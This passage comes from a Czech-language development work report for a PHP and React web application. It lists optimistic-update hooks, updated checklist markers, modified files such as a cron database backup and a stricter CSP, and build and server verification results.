### 6. Optimistic updates + rollback
- 13 delete hooků dostalo optimistic update pattern:
  - `onMutate` — okamžitá změna cache (odstranění položky)
  - `onError` — rollback (vrácení previous data)
  - `onSettled` — invalidate queries
- Hooky: useDeleteTask, useDeleteProject, useDeleteClient, useDeleteNote,
  useDeleteWorklog, useDeleteFile, useDeleteTransaction, useDeleteInvoice,
  useDeleteInvoicePayment, useDeleteCredential, useDeleteBackup, useDeleteRestore,
  useDeleteWpInstall

## Dokumentace

### 7. Aktualizace zastaralých markerů
- 21 zastaralých markerů aktualizováno z `[ ]` na `[O]` (již dříve opraveno)
- session.cookie_lifetime, IBAN validace, APP_DEBUG, .gitignore, logy,
  500 stránka, CORS, config.php permissions, json_input limity, React.lazy,
  skeletony, profil, fmtClientName, vhost, .htaccess storage, React.memo,
  stabilní keys, session.cookie_lifetime (znovu), realpath, DI, upload typy,
  Tailwind purge, N+1 dotazy

## Soubory upravené ve Vlně 9

### Změněné soubory
- `/etc/cron.d/devapppro-cleanup` — přidán DB backup cron
- `config/config.php` — fail-fast pro web requesty bez secrets
- `src/Core/Constants.php` — DEFAULT_PER_PAGE=50, MAX_PER_PAGE=100
- `src/Repositories/UserRepository.php` — Constants::MAX_PER_PAGE
- 8 controllerů v `src/Controllers/` — Constants::DEFAULT_PER_PAGE/MAX_PER_PAGE + *_STATUSES
- `frontend/src/lib/constants.ts` — DEFAULT_PER_PAGE=50, MAX_PER_PAGE=100
- 6 frontend stránek — DEFAULT_PER_PAGE import
- `frontend/src/components/layout/Sidebar.tsx` — prefetch="intent"
- 12 hook souborů v `frontend/src/hooks/` — optimistic updates
- `frontend/src/pages/DashboardPage.tsx` — CSS proměnná --progress
- `frontend/src/pages/BackupsPage.tsx` — CSS proměnná --progress
- `frontend/src/styles/globals.css` — .progress-bar utility
- `.htaccess` — CSP bez unsafe-inline

### Zálohy vytvořené
- `/etc/cron.d/devapppro-cleanup.bak2`

## Ověření
- PHP syntax: všechny změněné soubory OK
- Frontend build: úspěšný (1722 modulů)
- HTTP: 200, HTTPS: 200, API: 200
- CSP: strict (bez unsafe-inline)
- PHP-FPM: active
- Cron DB zálohy: nastaven, testovací záloha úspěšná
